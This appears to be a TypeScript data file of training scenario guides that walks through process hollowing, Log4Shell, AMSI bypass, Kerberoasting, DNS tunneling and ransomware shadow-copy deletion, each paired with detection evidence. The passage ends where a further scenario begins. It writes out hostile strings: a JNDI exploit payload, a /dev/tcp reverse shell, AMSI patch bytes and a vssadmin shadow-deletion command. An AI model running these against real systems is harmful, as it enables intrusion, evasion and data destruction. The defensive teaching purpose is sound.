import { RawScenarioStepGuideData } from '../scenario-step-guides';

export const CORE_AND_PALOALTO_STEP_GUIDES: Record<string, RawScenarioStepGuideData> = {
  'process-hollowing': {
    scenarioId: 'process-hollowing',
    briefing: {
      headline: 'Scenario Briefing: Disguising Malware Inside a Trusted Windows Process (svchost.exe)',
      plainSummary:
        'Based on MITRE ATT&CK T1055.012 and Windows Sysmon Process Tampering documentation, this scenario explains how an attacker hides a Cobalt Strike Beacon inside a genuine Windows system program so basic antivirus and host firewall rules do not block it. When the loader program (Invoice_Q4.exe, PID 3104) runs on the victim workstation, it does not execute its malicious payload directly. Instead, it launches the legitimate Windows Service Host (C:\\Windows\\System32\\svchost.exe, PID 4892) in a paused ("suspended") state, unmaps ("hollows out") the real Windows code from memory at 0x00400000, writes the Cobalt Strike Beacon into that emptied space, redirects the frozen thread entry point, and resumes the process so the malware runs under the trusted name and path of svchost.exe.',
      diagramTopologySummary:
        'Read the diagram step by step: Node ①/③ (Invoice_Q4.exe Loader PID 3104) invokes Windows Native APIs in Node ② (Kernel / NTDLL API) to hollow out Node ④ (svchost.exe PID 4892), which then beacons out to Node ⑤ (Attacker C2 Server 185.220.101.42:443) while Node ⑥ (Sysmon & EDR Sensor) records Event IDs 1, 10, and 25.',
      documentedAdvisory: 'MITRE ATT&CK T1055.012 · T1106 · T1071.001 · Sysmon EventID 1 / 10 / 25 (ProcessTampering)',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1106',
        plainTitle: 'Launching a Genuine Windows Process (svchost.exe) in a Paused ("Suspended") State',
        simpleExplanation:
          'The packed loader program Invoice_Q4.exe (PID 3104) calls the Windows API CreateProcessW to start the legitimate Windows binary C:\\Windows\\System32\\svchost.exe (PID 4892). Crucially, it passes the creation flag CREATE_SUSPENDED (dwCreationFlags = 0x4), which tells Windows to create the process and allocate its memory space, but freeze its main thread before a single instruction of svchost.exe can run.',
        howItWorksInPractice:
          'Normally, svchost.exe is only started by the Windows Service Control Manager (services.exe) with a "-k" service group flag. Seeing a user-downloaded program (Invoice_Q4.exe) spawn svchost.exe with no command-line arguments in a suspended state is an immediate behavioral indicator captured in Sysmon Event ID 1.',
        diagramAlignment:
          'On the diagram, arrow #1.1→ shows Invoice_Q4.exe (PID 3104) spawning svchost.exe (PID 4892) with CREATE_SUSPENDED (0x4), while return arrow ⇠#1.2 logs Sysmon Event ID 1.',
        detectionAndEvidence:
          'Documented in Sysmon Event ID 1 (ProcessCreate): ParentImage Invoice_Q4.exe (PID 3104) spawning C:\\Windows\\System32\\svchost.exe (PID 4892) without "-k" service arguments.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1055.012',
        plainTitle: 'Carving Out ("Unmapping") the Original Windows Code from RAM',
        simpleExplanation:
          'While svchost.exe (PID 4892) is still frozen, the loader queries its Process Environment Block (PEB) using NtQueryInformationProcess to find where its executable code is loaded in memory (ImageBaseAddress = 0x00400000). It then calls the native syscall NtUnmapViewOfSection(hProcess, 0x00400000) from ntdll.dll to completely strip the legitimate svchost.exe program code out of RAM.',
        howItWorksInPractice:
          'After NtUnmapViewOfSection finishes, the process container for svchost.exe (PID 4892) still exists in Windows with its trusted process token and file path, but its primary code region at 0x00400000 is now an empty ("hollowed") shell.',
        diagramAlignment:
          'On the diagram, arrow #2.1→ flows through Kernel / NTDLL API into svchost.exe (PID 4892) executing NtUnmapViewOfSection at 0x00400000, and ⇠#2.2 returns STATUS_SUCCESS.',
        detectionAndEvidence:
          'Documented in Native API / ETW Telemetry: NtUnmapViewOfSection unmapping the primary image section at BaseAddress 0x00400000 inside suspended process PID 4892.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1055.012',
        plainTitle: 'Allocating RWX Memory & Copying the Cobalt Strike Beacon Into the Hollowed Shell',
        simpleExplanation:
          'Next, Invoice_Q4.exe calls VirtualAllocEx on the hollowed svchost.exe process to allocate 264 KB of fresh memory at base address 0x00400000 with Read-Write-Execute (PAGE_EXECUTE_READWRITE, 0x40) permissions. It then calls WriteProcessMemory to copy the unpacked Cobalt Strike Beacon PE header ("MZ") and executable code sections directly into that space.',
        howItWorksInPractice:
          'On disk, C:\\Windows\\System32\\svchost.exe is completely untouched and still carries Microsoft’s digital signature. In RAM, however, address 0x00400000 inside PID 4892 is now an unbacked private RWX memory block holding the Cobalt Strike payload.',
        diagramAlignment:
          'On the diagram, arrow #3.1→ writes 264 KB of RWX PE payload from Invoice_Q4.exe into svchost.exe memory (0x00400000), and ⇠#3.2 records Sysmon Event ID 10 (GrantedAccess 0x1FFFFF).',
        detectionAndEvidence:
          'Documented in Sysmon Event ID 10 (ProcessAccess with GrantedAccess=0x1FFFFF) and memory inspection showing an injected MZ/PE header and 264 KB RWX section at 0x00400000.',
      },
      {
        stepNumber: 4,
        mitreId: 'T1055.012',
        plainTitle: 'Redirecting the Frozen Thread Entry Point & Resuming Execution (Sysmon Event ID 25)',
        simpleExplanation:
          'With the Cobalt Strike code in place, the loader calls SetThreadContext on the frozen thread inside svchost.exe, overwriting its EAX register so the thread’s starting address points to the injected malware entry point (0x004014A0). Finally, it calls ResumeThread to unfreeze svchost.exe so Windows begins running the implanted beacon.',
        howItWorksInPractice:
          'When the thread wakes up and runs code from an unmapped/replaced image section, the Windows kernel and Sysmon detect that the in-memory image of svchost.exe no longer matches the file on disk, immediately logging Sysmon Event ID 25 (ProcessTampering: "Image is replaced").',
        diagramAlignment:
          'On the diagram, arrow #4.1→ updates the thread context (EAX -> 0x004014A0) and resumes svchost.exe (PID 4892), while ⇠#4.2 triggers Sysmon Event ID 25 on the EDR/SIEM sensor.',
        detectionAndEvidence:
          'Documented in Sysmon Event ID 25 (ProcessTampering): Process C:\\Windows\\System32\\svchost.exe (PID 4892) flagged with Type="Image is replaced".',
      },
      {
        stepNumber: 5,
        mitreId: 'T1071.001',
        plainTitle: 'Outbound HTTPS Command-and-Control Beacon Disguised as Web Traffic',
        simpleExplanation:
          'Now running inside the trusted svchost.exe process (PID 4892), the Cobalt Strike Beacon opens an encrypted HTTPS connection on TCP port 443 to the external Command-and-Control server at 185.220.101.42. Using a "Malleable C2" profile, it disguises its requests as normal downloads of /jquery-3.3.1.min.js.',
        howItWorksInPractice:
          'Basic host firewalls allow svchost.exe to talk to the internet. However, network IDS sensors (Suricata) spot the known Cobalt Strike TLS fingerprint (JA3 hash 72a589da586844d7f0818ce684948eea) combined with an unbacked svchost.exe process making external web connections.',
        diagramAlignment:
          'On the diagram, arrow #5.1→ traces the HTTPS C2 beacon from hollowed svchost.exe (PID 4892) to Attacker C2 Server (185.220.101.42:443), and ⇠#5.2 returns the 1.4 KB encrypted C2 tasking.',
        detectionAndEvidence:
          'Documented in Sysmon Event ID 3 (NetworkConnect from svchost.exe to 185.220.101.42:443) and Suricata IDS Alert matching JA3 fingerprint 72a589da586844d7f0818ce684948eea on /jquery-3.3.1.min.js.',
      },
    ],
  },

  'log4shell-dfir': {
    scenarioId: 'log4shell-dfir',
    briefing: {
      headline: 'Scenario Briefing: Log4Shell (CVE-2021-44228) — How Logging an HTTP Header Leads to Server Takeover',
      plainSummary:
        'Based on CISA Alert AA21-356A and NVD CVE-2021-44228, this scenario explains the critical Log4Shell vulnerability in Apache Log4j2. Normally, a web server records incoming visitor details (such as the browser’s User-Agent header) into a log file. However, vulnerable versions of Log4j2 automatically evaluate special "${jndi:...}" lookup expressions whenever they format a log line. By sending an obfuscated ${${lower:j}ndi:${lower:l}dap://91.214.124.88:1389/Exploit} string in an HTTP header, the attacker tricks the internal Spring Boot Java server into connecting out to a rogue LDAP server, downloading a malicious Java class file, and spawning a reverse shell.',
      diagramTopologySummary:
        'Read the diagram from left to right: Node ① (Attacker Scanner 91.214.124.88) sends the HTTP POST request through Node ② (Nginx Reverse Proxy 10.20.1.10) to Node ③ (Spring Boot Java Server 10.20.1.15, PID 1420). The Java server reaches out to Node ⑤ (Rogue LDAP Server :1389/:8888), loads Exploit.class, and spawns /bin/sh (PID 8912) while Node ⑥ (Linux Auditd & SIEM) records the execution chain.',
      documentedAdvisory: 'CISA Alert AA21-356A · NVD CVE-2021-44228 · MITRE ATT&CK T1190 / T1203 / T1105 / T1059.004',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1190',
        plainTitle: 'Injecting an Obfuscated "${jndi:ldap://...}" String Inside an HTTP Login Request',
        simpleExplanation:
          'The attacker at 91.214.124.88 sends an HTTP POST request to /api/v1/login on the Nginx reverse proxy (10.20.1.10). Hidden inside the User-Agent header is the obfuscated lookup string ${${lower:j}ndi:${lower:l}dap://91.214.124.88:1389/Exploit}. Even though the login fails with HTTP 401 Unauthorized, Nginx forwards the request to the Spring Boot backend, which logs the failed login attempt along with the User-Agent string.',
        howItWorksInPractice:
          'Attackers nest "${lower:j}" and "${lower:l}" inside the header so simple Web Application Firewall (WAF) rules looking for the literal text "${jndi:ldap" fail to block the request, while Log4j2 still unwraps and evaluates the full string when writing to app.log.',
        diagramAlignment:
          'On the diagram, arrow #1.1→ sends the HTTP POST with the obfuscated JNDI User-Agent from 91.214.124.88 into Nginx (10.20.1.10) and Spring Boot, while ⇠#1.2 returns HTTP 401.',
        detectionAndEvidence:
          'Documented in /var/log/nginx/access.log and /var/log/billing-service/app.log: POST /api/v1/login containing "${${lower:j}ndi:${lower:l}dap://91.214.124.88:1389/Exploit}".',
      },
      {
        stepNumber: 2,
        mitreId: 'T1203',
        plainTitle: 'Log4j Evaluates the Log String & Opens an Outbound LDAP Connection (Port 1389)',
        simpleExplanation:
          'When the Java application calls logger.info() or logger.warn(), Log4j2 parses the ${jndi:ldap://...} token and invokes JndiManager.lookup(). This forces the internal Spring Boot server (10.20.1.15) to initiate an outbound TCP connection on port 1389 directly to the attacker’s rogue LDAP server at 91.214.124.88.',
        howItWorksInPractice:
          'Java Naming and Directory Interface (JNDI) is meant to let enterprise Java applications look up shared objects on internal company directory servers. Because vulnerable Log4j2 versions did not restrict external lookups, the server blindly connects to the attacker’s IP on the internet.',
        diagramAlignment:
          'On the diagram, arrow #2.1→ traces the outbound TCP/1389 LDAP lookup from Spring Boot (10.20.1.15) to Rogue LDAP (91.214.124.88:1389), and ⇠#2.2 returns the LDAP referral response.',
        detectionAndEvidence:
          'Documented in Zeek / Suricata IDS Alert: Internal DMZ web server 10.20.1.15 initiating an outbound LDAP query on TCP port 1389 to external IP 91.214.124.88.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1105',
        plainTitle: 'Following the LDAP Referral to Download & Load Exploit.class Into the JVM',
        simpleExplanation:
          'The attacker’s rogue LDAP server replies with a JNDI Reference entry containing javaCodeBase="http://91.214.124.88:8888/" and javaFactory="Exploit". Obeying those instructions, the victim Java Virtual Machine (JVM) sends an HTTP GET request to download Exploit.class (compiled Java bytecode starting with magic bytes 0xCAFEBABE) and loads it into memory.',
        howItWorksInPractice:
          'As soon as Java’s URLClassLoader loads Exploit.class into memory to instantiate the object, the code inside the class’s static{} initializer block runs automatically with the permissions of the tomcat/java process.',
        diagramAlignment:
          'On the diagram, arrow #3.1→ fetches http://91.214.124.88:8888/Exploit.class into the Spring Boot JVM, and ⇠#3.2 delivers the 0xCAFEBABE Java class payload.',
        detectionAndEvidence:
          'Documented in Network HTTP / Packet Telemetry: Outbound GET /Exploit.class from 10.20.1.15 to 91.214.124.88:8888 returning application/java-vm bytecode.',
      },
      {
        stepNumber: 4,
        mitreId: 'T1059.004',
        plainTitle: 'The Java Process Spawns a Linux Reverse Shell (/bin/sh → /bin/bash)',
        simpleExplanation:
          'Inside Exploit.class, the payload calls Runtime.getRuntime().exec(), causing the running java process (PID 1420) to spawn /bin/sh (PID 8912) running "bash -i >& /dev/tcp/91.214.124.88/4444 0>&1". This opens an interactive reverse shell back to the attacker on TCP port 4444 under the tomcat service user.',
        howItWorksInPractice:
          'A production Java web server should never spawn interactive Unix shell processes. On the Linux host, the kernel audit daemon (auditd) immediately logs syscall=59 (execve) showing parent process java (ppid=1420) executing /bin/sh.',
        diagramAlignment:
          'On the diagram, arrow #4.1→ connects the spawned /bin/sh shell on Spring Boot to Auditd/SIEM and Attacker listener (91.214.124.88:4444), while ⇠#4.2 records the Linux Auditd EXECVE alert.',
        detectionAndEvidence:
          'Documented in /var/log/audit/audit.log (SYSCALL syscall=59 execve): ppid=1420 (java) spawning pid=8912 (/bin/sh -c bash -i >& /dev/tcp/91.214.124.88/4444 0>&1).',
      },
    ],
  },

  'amsi-reflective-dll': {
    scenarioId: 'amsi-reflective-dll',
    briefing: {
      headline: 'Scenario Briefing: Blinding Windows Antimalware Scan Interface (AMSI) & Reflective DLL Loading',
      plainSummary:
        'Documented under MITRE ATT&CK T1562.001 and T1620, this scenario shows how "fileless" malware runs inside Windows PowerShell without being blocked by antivirus software or leaving a DLL file on the hard drive. Whenever PowerShell starts, Windows loads amsi.dll into its process memory so every script block is inspected by AmsiScanBuffer(). Here, the attacker runs a PowerShell script (PID 6120) that locates AmsiScanBuffer in memory, overwrites the first 6 bytes of that function so it immediately returns an error code without scanning anything, and then maps a malicious DLL directly into private heap memory (0x024A80000) without touching the disk.',
      diagramTopologySummary:
        'Read the diagram step by step: Node ①/③ (powershell.exe Stager PID 6120) resolves and patches Node ②/④ (amsi.dll!AmsiScanBuffer at 0x7FF91A042480), then maps its payload into Node ⑤ (Reflective Heap 0x024A80000) while Node ⑥ (SIEM / PowerShell Event ID 4104) captures the deobfuscated script block and memory modification.',
      documentedAdvisory: 'MITRE ATT&CK T1562.001 · T1620 · Microsoft PowerShell Event ID 4104 (ScriptBlock Logging)',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1562.001',
        plainTitle: 'Finding the Memory Address of AmsiScanBuffer Inside PowerShell (Event ID 4104)',
        simpleExplanation:
          'When powershell.exe (PID 6120) starts, Windows automatically loads C:\\Windows\\System32\\amsi.dll into its memory space. To avoid static signature detection, the attacker’s script splits the function name ("Amsi" + "ScanBuffer") and uses .NET P/Invoke (GetProcAddress) to look up the exact memory address where AmsiScanBuffer lives in RAM (0x7FF91A042480).',
        howItWorksInPractice:
          'Because AMSI has not been disabled yet when this first script block runs, Windows PowerShell Event ID 4104 (ScriptBlock Logging) captures and records the entire deobfuscated script—including the VirtualProtect and Marshal.Copy calls—into the Windows Event Log.',
        diagramAlignment:
          'On the diagram, arrow #1.1→ shows powershell.exe (PID 6120) resolving AmsiScanBuffer while logging Event ID 4104 to the SIEM sensor, and ⇠#1.2 returns the warning log.',
        detectionAndEvidence:
          'Documented in Microsoft-Windows-PowerShell/Operational Event ID 4104: ScriptBlockText containing GetProcAddress(LoadLibrary("amsi.dll"), "Amsi" + "ScanBuffer") and VirtualProtect.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1562.001',
        plainTitle: 'Overwriting 6 Bytes of AmsiScanBuffer so It Stops Scanning Scripts',
        simpleExplanation:
          'Because the code section (.text) of amsi.dll is normally read-only (PAGE_EXECUTE_READ), the script calls Win32 VirtualProtect() to make the 6 bytes at 0x7FF91A042480 writable (0x40). It then uses Marshal.Copy to overwrite the start of AmsiScanBuffer with 6 bytes of x64 machine code: B8 57 00 07 80 C3.',
        howItWorksInPractice:
          'In x64 assembly, "B8 57 00 07 80 C3" translates to "mov eax, 0x80070057; ret". From that moment on, every time PowerShell calls AmsiScanBuffer to inspect a new command or payload, the function immediately exits with E_INVALIDARG (0x80070057) before scanning a single byte.',
        diagramAlignment:
          'On the diagram, arrow #2.1→ flows from powershell.exe (PID 6120) to amsi.dll (0x7FF91A042480) applying the 6-byte patch, and ⇠#2.2 confirms the prologue is overwritten.',
        detectionAndEvidence:
          'Documented in Win32 API / x64 Disassembly & Copy-on-Write Memory Telemetry: amsi!AmsiScanBuffer prologue at 0x7FF91A042480 modified to mov eax, 0x80070057; ret.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1620',
        plainTitle: 'Reflectively Loading a Malicious DLL Directly from a Memory Buffer',
        simpleExplanation:
          'With AMSI blinded for the rest of the PowerShell session, the script downloads an encrypted DLL byte array directly into RAM. Instead of saving the DLL to disk and calling LoadLibrary() (which would trigger Sysmon Event ID 7 and antivirus file scans), a custom ReflectiveLoader stub manually maps the DLL’s PE sections into private heap memory at 0x024A80000 and calls DllMain.',
        howItWorksInPractice:
          'Because the DLL was mapped manually in heap memory rather than through the Windows loader, it never appears in the Process Environment Block (PEB->Ldr) loaded module list and leaves zero files on disk. However, memory scanners still catch the unbacked RWX heap region starting with MZ/PE magic bytes.',
        diagramAlignment:
          'On the diagram, arrow #3.1→ maps the PE sections from powershell.exe into Reflective Heap (0x024A80000), and ⇠#3.2 alerts the SIEM memory scanner to the unbacked MZ/PE allocation.',
        detectionAndEvidence:
          'Documented in Memory Forensic Scan: Private unbacked RWX heap allocation at 0x024A80000 inside powershell.exe (PID 6120) containing manually mapped MZ/PE headers.',
      },
    ],
  },

  'ad-kerberoasting': {
    scenarioId: 'ad-kerberoasting',
    briefing: {
      headline: 'Scenario Briefing: Active Directory Kerberoasting & Lateral Movement via SMB / PsExec',
      plainSummary:
        'Documented under MITRE ATT&CK T1558.003, T1550.002, and T1543.003, this scenario shows how an attacker escalates from a standard domain user account (CORP\\m.karimi on finance workstation WS-FINANCE-04) to full SYSTEM control of a production database server (SQL01). Any authenticated domain user can ask the Domain Controller (DC01) for a Kerberos service ticket (TGS) to connect to SQL Server. By forcing the Domain Controller to encrypt that ticket with legacy RC4-HMAC (0x17) instead of AES-256, the attacker extracts the ticket hash with Rubeus, cracks the svc_mssql password offline with Hashcat, logs into SQL01 over SMB, and uses PsExec to launch a SYSTEM service.',
      diagramTopologySummary:
        'Read the diagram step by step: Node ①/③ (WS-FINANCE-04 10.10.20.45 running Rubeus.exe PID 3920) requests an RC4 TGS ticket from Node ②/⑤ (DC01.corp.local:88), cracks the hash offline, authenticates over SMB (port 445) to SQL01 (10.10.5.20), and installs PSEXESVC.exe (PID 5190) while Node ⑥ (Splunk SIEM) correlates Event IDs 4769, 4624, and 7045.',
      documentedAdvisory: 'MITRE ATT&CK T1558.003 · T1550.002 · T1543.003 · Windows Security EID 4769 / 4624 & System EID 7045',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1558.003',
        plainTitle: 'Requesting an RC4-Downgraded Kerberos Service Ticket from the Domain Controller (Event 4769)',
        simpleExplanation:
          'From workstation WS-FINANCE-04 (10.10.20.45), compromised user CORP\\m.karimi runs Rubeus.exe (PID 3920) to request a Kerberos TGS service ticket for the SQL Server Service Principal Name (MSSQLSvc/sql01.corp.local:1433, run by account svc_mssql). Although modern Active Directory uses AES-256 (0x12), Rubeus specifically requests legacy RC4-HMAC encryption (TicketEncryptionType = 0x17).',
        howItWorksInPractice:
          'When DC01 issues an RC4-encrypted TGS ticket, the ticket payload is encrypted directly with the NTLM password hash of the svc_mssql account. Rubeus prints the resulting $krb5tgs$23$ hash so the attacker can crack it offline without sending a single failed password attempt to the Domain Controller.',
        diagramAlignment:
          'On the diagram, arrow #1.1→ sends the Kerberos TGS request from WS-FINANCE-04 (10.10.20.45) to DC01.corp.local:88, and ⇠#1.2 returns the RC4 ticket while logging Security Event ID 4769.',
        detectionAndEvidence:
          'Documented in Windows Security Event ID 4769 on DC01.corp.local: TargetUserName=m.karimi@CORP.LOCAL, ServiceName=svc_mssql, TicketEncryptionType=0x17.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1550.002',
        plainTitle: 'Cracking the Ticket Offline & Authenticating Over SMB to SQL01 (Event 4624)',
        simpleExplanation:
          'The attacker cracks the $krb5tgs$23$ hash offline using Hashcat (-m 13100) and recovers the credentials/NTLM hash for CORP\\svc_mssql. Using those recovered credentials, they authenticate over SMB (TCP port 445) directly from finance workstation WS-FINANCE-04 (10.10.20.45) to the database server SQL01 (10.10.5.20).',
        howItWorksInPractice:
          'Because the credentials are valid, SQL01 accepts the connection and records Windows Security Event ID 4624 (LogonType = 3 Network). However, a backend SQL service account (svc_mssql) logging in interactively over the network from a finance workstation IP is a major behavioral anomaly.',
        diagramAlignment:
          'On the diagram, arrow #2.1→ authenticates over SMB (port 445) from WS-FINANCE-04 (10.10.20.45) to SQL01 (10.10.5.20) as svc_mssql, and ⇠#2.2 records Security Event ID 4624 (LogonType 3).',
        detectionAndEvidence:
          'Documented in Windows Security Event ID 4624 on SQL01.corp.local: TargetUserName=svc_mssql, LogonType=3, AuthenticationPackageName=NTLM, IpAddress=10.10.20.45.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1543.003',
        plainTitle: 'Installing & Starting a Remote SYSTEM Service on SQL01 via PsExec (Event 7045)',
        simpleExplanation:
          'To execute commands on SQL01 with maximum privileges, the attacker uses PsExec/Impacket over the authenticated SMB session: uploading PSEXESVC.exe to the hidden ADMIN$ share on SQL01 and instructing the Windows Service Control Manager (services.exe, PID 628) to register and start a new service (PID 5190) running as NT AUTHORITY\\SYSTEM.',
        howItWorksInPractice:
          'Whenever a new Windows service is created on a server, the Service Control Manager writes System Event ID 7045 (and Security Event ID 4697), recording the exact service name, executable path (%SystemRoot%\\PSEXESVC.exe), and LocalSystem account.',
        diagramAlignment:
          'On the diagram, arrow #3.1→ registers PSEXESVC.exe on SQL01 via the Service Control Manager and alerts the Splunk SIEM node, while ⇠#3.2 confirms SYSTEM shell execution and Event ID 7045.',
        detectionAndEvidence:
          'Documented in Windows System Event ID 7045 on SQL01.corp.local: New service installed with ImagePath C:\\Windows\\PSEXESVC.exe running as NT AUTHORITY\\SYSTEM.',
      },
    ],
  },

  'dns-tunneling-exfil': {
    scenarioId: 'dns-tunneling-exfil',
    briefing: {
      headline: 'Scenario Briefing: Covert DNS Tunneling — Exfiltrating Customer Data Inside DNS TXT Queries',
      plainSummary:
        'Based on MITRE ATT&CK T1048.003 and T1071.004, this scenario explains how an attacker steals a sensitive file (customers_pii.csv) from an isolated database server that is blocked from accessing the internet over HTTP or HTTPS. Because internal servers can still send domain name lookups to the corporate DNS resolver (10.50.1.53, UDP port 53), the implant (sync_agent.exe, PID 4412) chops the CSV file into 48-byte chunks, converts each chunk into hexadecimal text, and embeds it as a subdomain of an attacker-controlled domain (<seq>.<hex_data>.c2.badactor-dns.net). When the internal DNS resolver tries to look up that domain, it automatically forwards the stolen data across the firewall to the attacker’s authoritative nameserver.',
      diagramTopologySummary:
        'Read the diagram step by step: Node ③/④ (Infected Database Host 10.50.1.12 running sync_agent.exe PID 4412) sends hex-encoded DNS TXT queries to Node ② (Corporate Internal DNS Resolver 10.50.1.53:53), which recursively forwards them through the firewall to Node ①/⑤ (Attacker Authoritative Name Server 45.133.1.99:53) while Sysmon EID 22 and Zeek dns.log capture the high-entropy stream.',
      documentedAdvisory: 'MITRE ATT&CK T1048.003 · T1071.004 · Sysmon Event ID 22 (DNSEvent) & Zeek dns.log',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1048.003',
        plainTitle: 'Slicing customers_pii.csv & Hex-Encoding Rows Into Subdomain Queries (Sysmon Event ID 22)',
        simpleExplanation:
          'On the infected database host (10.50.1.12), the malicious program C:\\ProgramData\\sync_agent.exe (PID 4412) reads C:\\Backups\\customers_pii.csv, splits each row into 48-byte chunks, and converts the text into hexadecimal characters (for example, "343130322c616c695f72657a6165692c30393132"). It then calls DnsQuery_A to ask the internal DNS server (10.50.1.53) for the TXT record of 001.343130322c616c695f72657a6165692c30393132.c2.badactor-dns.net.',
        howItWorksInPractice:
          'On the endpoint, Sysmon Event ID 22 (DNSEvent) records both the exact process that made the DNS lookup (C:\\ProgramData\\sync_agent.exe) and the abnormally long, high-entropy query name (4.48 bits/char vs normal domains < 3.2). Decoding the hex label reveals the plaintext CSV row ("4102,ali_rezaei,0912").',
        diagramAlignment:
          'On the diagram, arrow #1.1→ sends the DNS TXT query from sync_agent.exe on 10.50.1.12 to the Internal DNS Resolver (10.50.1.53:53), and ⇠#1.2 logs Sysmon Event ID 22.',
        detectionAndEvidence:
          'Documented in Sysmon Event ID 22: ProcessId 4412 (C:\\ProgramData\\sync_agent.exe) querying 001.343130322c616c695f72657a6165692c30393132.c2.badactor-dns.net.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1071.004',
        plainTitle: '100% Cache Miss Forces the Corporate DNS Server to Forward Every Chunk to the Attacker',
        simpleExplanation:
          'Because every DNS query contains a unique sequence number and a different chunk of hex-encoded CSV data, none of the subdomains exist in the corporate DNS server’s cache (a 100% cache miss rate). Following standard DNS recursion rules, the internal DNS server (10.50.1.53) forwards every single TXT query across the perimeter firewall to the authoritative Name Server for badactor-dns.net (45.133.1.99:53).',
        howItWorksInPractice:
          'Even though the infected database server is blocked from talking directly to the internet, the corporate DNS server is allowed through the firewall on UDP port 53—inadvertently acting as a courier that carries each chunk of stolen data outside the network.',
        diagramAlignment:
          'On the diagram, arrow #2.1→ relays the recursive TXT query from Internal DNS (10.50.1.53) through the firewall to Attacker Name Server (45.133.1.99:53), and ⇠#2.2 records the Zeek dns.log entry.',
        detectionAndEvidence:
          'Documented in Zeek dns.log & Suricata SID 9004120: Outbound UDP/53 TXT query from 10.50.1.53 to 45.133.1.99 with 100% unique long subdomain labels.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1071.004',
        plainTitle: 'Reassembling the Stolen CSV File & Returning C2 Commands Inside the DNS TXT Answer',
        simpleExplanation:
          'As the queries arrive at 45.133.1.99, the attacker’s authoritative DNS server strips off the .c2.badactor-dns.net suffix, decodes the hexadecimal chunks in order, and reconstructs customers_pii.csv. To confirm receipt and control the implant, the server replies with a DNS TXT record ("ACK:001:NEXT" or "ACK:001:CMD:SLEEP_60") with Time-To-Live set to zero (TTL=0).',
        howItWorksInPractice:
          'Setting TTL=0 ensures the corporate DNS resolver does not cache the response, while embedding commands inside the TXT answer field provides a bidirectional Command-and-Control channel entirely over DNS.',
        diagramAlignment:
          'On the diagram, arrow #3.1→ / ⇠#3.2 returns the DNS TXT response ("ACK:001:NEXT", TTL=0) from Attacker Name Server (45.133.1.99) back through Internal DNS to sync_agent.exe.',
        detectionAndEvidence:
          'Documented in Zeek dns.log & Sysmon EID 22 QueryResults: TXT response "ACK:001:NEXT" with TTL=0.000000 returned from 45.133.1.99.',
      },
    ],
  },

  'ransomware-shadow-wipe': {
    scenarioId: 'ransomware-shadow-wipe',
    briefing: {
      headline: 'Scenario Briefing: Ransomware Execution — Deleting Volume Shadow Backups & Intermittent Encryption',
      plainSummary:
        'Grounded in CISA Advisory AA23-165A and MITRE ATT&CK T1490 / T1486, this scenario demonstrates the two critical host execution stages of LockBit 3.0 ransomware (C:\\Windows\\Temp\\lb3_payload.exe, PID 5540). Before encrypting a single file, the ransomware spawns vssadmin.exe delete shadows /all /quiet (PID 5812) to destroy Windows Volume Shadow Copy backups so administrators cannot restore files. Immediately afterward, it uses high-speed intermittent encryption to lock the first 64 KB of every file on shared drives, appends the .lockbit extension, and drops Restore-My-Files.txt ransom notes.',
      diagramTopologySummary:
        'Read the diagram step by step: Node ①/③ (lb3_payload.exe PID 5540) spawns Node ②/④ (vssadmin.exe PID 5812) to wipe Volume Shadow Copies, and then encrypts Node ⑤ (File System Shares D:\\Shares\\Finance\\) while Node ⑥ (EDR Minifilter & SIEM) captures Sysmon Event IDs 1 and 11.',
      documentedAdvisory: 'CISA Alert AA23-165A (LockBit 3.0) · MITRE ATT&CK T1490 / T1486 · Sysmon Event ID 1 & Event ID 11',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1490',
        plainTitle: 'Deleting All Windows Volume Shadow Copy Backups Before Encryption Starts (Sysmon Event ID 1)',
        simpleExplanation:
          'Before touching any user documents, the ransomware binary C:\\Windows\\Temp\\lb3_payload.exe (PID 5540) stops backup/database services and launches C:\\Windows\\System32\\vssadmin.exe delete shadows /all /quiet (PID 5812) along with bcdedit /set {default} recoveryenabled No. This silently wipes all local Volume Shadow Copy snapshots on the server.',
        howItWorksInPractice:
          'Because shadow copy deletion (MITRE T1490) always happens right before file encryption begins, this step is the golden defensive window: an automated EDR or SOAR rule that immediately suspends and terminates the parent process (PID 5540) of any unauthorized "vssadmin delete shadows" command stops the ransomware before data is encrypted.',
        diagramAlignment:
          'On the diagram, arrow #1.1→ shows lb3_payload.exe (PID 5540) spawning vssadmin.exe (PID 5812) to wipe the VSS service, and ⇠#1.2 triggers a Critical Sysmon Event ID 1 alert on the EDR sensor.',
        detectionAndEvidence:
          'Documented in Sysmon Event ID 1 (ProcessCreate): ParentImage C:\\Windows\\Temp\\lb3_payload.exe (PID 5540) launching vssadmin.exe delete shadows /all /quiet (PID 5812).',
      },
      {
        stepNumber: 2,
        mitreId: 'T1486',
        plainTitle: 'High-Speed Intermittent File Encryption & Dropping Ransom Notes (Sysmon Event ID 11)',
        simpleExplanation:
          'To encrypt terabytes of shared files as fast as possible, lb3_payload.exe (PID 5540) uses Windows I/O Completion Ports and "Intermittent Encryption"—encrypting only the first 64 KB of each file using hardware AES-NI instructions, renaming files with the .lockbit extension, and writing Restore-My-Files.txt into every folder (such as D:\\Shares\\Finance\\Restore-My-Files.txt).',
        howItWorksInPractice:
          'Encrypting only the first 64 KB header of each file renders PDFs, Office documents, and databases completely unreadable while allowing the ransomware to corrupt thousands of files per second. Sysmon Event ID 11 and EDR kernel minifilters immediately detect the ransom note creation and mass file renames.',
        diagramAlignment:
          'On the diagram, arrow #2.1→ flows from lb3_payload.exe (PID 5540) into the File System (D:\\Shares\\Finance\\) encrypting headers and dropping Restore-My-Files.txt, while ⇠#2.2 logs Sysmon Event ID 11.',
        detectionAndEvidence:
          'Documented in Sysmon Event ID 11 (FileCreate): Process C:\\Windows\\Temp\\lb3_payload.exe (PID 5540) creating D:\\Shares\\Finance\\Restore-My-Files.txt (4.1 KB).',
      },
    ],
  },

  'unit42-panos-midnight-eclipse': {
